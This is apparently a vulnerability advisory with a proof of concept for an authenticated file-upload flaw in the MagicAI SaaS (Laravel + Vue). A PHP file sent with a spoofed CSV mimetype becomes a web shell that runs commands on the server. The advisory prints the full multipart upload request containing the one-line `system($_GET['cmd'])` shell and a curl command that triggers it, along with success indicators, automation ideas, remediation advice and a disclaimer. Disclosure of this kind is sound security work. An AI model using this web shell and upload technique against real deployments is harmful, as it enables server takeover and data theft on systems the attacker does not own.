
# 🐚 MagicAI - Authenticated File Upload to RCE via Mimetype Manipulation 

📌 **Product Information**  
**Platform**: Laravel + Vue (SaaS)  
**Affected Feature**: File Upload on Chat File Analyzer  
**Tested Vulnerability**: Arbitrary File Upload via Mimetype Bypass  
**CVE**: Not Assigned  
**Severity**: Critical (RCE via file manager bypass)  
**CWE ID**: CWE-434  
**CWE Name**: Unrestricted Upload of File with Dangerous Type  
**Patched**: ❌ Not Applicable  
**Patch Priority**: 🔴 High  
**Date Published**: July 28, 2025  
**Researcher**: yucaerin  
**Vendor**: [liquidthemes](https://codecanyon.net/user/liquidthemes)  
**Product Link**: [MagicAI SaaS - Chat, Image, Code Generator](https://codecanyon.net/item/magicai-openai-content-text-image-chat-code-generator-as-saas/45408109)

---

⚠️ **Summary of the Vulnerability**  
MagicAI’s document analyzer feature allows users to upload `.csv` or document files. The backend does **not** sufficiently validate file content against its declared mimetype. As a result:

- Attacker can upload a PHP file disguised as a `.csv` (e.g., `shell.php` with `Content-Type: text/csv`)
- File gets stored in a publicly accessible folder or accessible via File Manager
- Remote command execution is possible if file is executed on server

## 🧪 Proof of Concept (PoC)

### ➤ Step 1 - Upload Malicious File via Analyzer Endpoint

```http
Content-Disposition: form-data; name="category_id"

15
------WebKitFormBoundary
Content-Disposition: form-data; name="doc"; filename="shell.php"
Content-Type: text/csv

<?php system($_GET['cmd']); ?>
------WebKitFormBoundary
Content-Disposition: form-data; name="type"

yucaerin/csv.php
aa
------WebKitFormBoundary--
```

### ➤ Step 2 - Trigger the Uploaded Payload

Assuming upload path is known or predictable:
```bash
curl https://target.com/uploads/temp.yucaerin/csv.php?cmd=id
```

✅ **Indicators of Success**:
- `uid=33(www-data)` or similar command output in response
- File accessible via web

## 🔍 Where’s the Flaw?
- Trusting client-supplied `Content-Type`
- No backend file signature validation
- Lack of strict file extension whitelist + file content inspection

## 🔐 Recommendation
- Validate mimetype **and** content on backend
- Only allow `.csv`, `.txt`, `.docx` with MIME and magic-byte checking
- Store uploads outside webroot or apply `.htaccess` deny execution
- Use Laravel’s `Storage::putFileAs()` with proper file visibility control

## ⚙️ Optional Automation Features
A script or tool can:
- Upload multiple payloads with varying extensions
- Search predictable upload paths
- Trigger RCE via GET parameter

## 🛑 Affected Versions
- MagicAI (as of July 2025) – no file upload protection on analyzer
- Deployment with file write permission + public path = vulnerable

## ⚠️ Disclaimer  
This PoC is for **educational and authorized security testing** only.  
Do **not** test on systems you don’t own or don’t have permission to analyze.  
Unauthorized access is illegal and unethical.
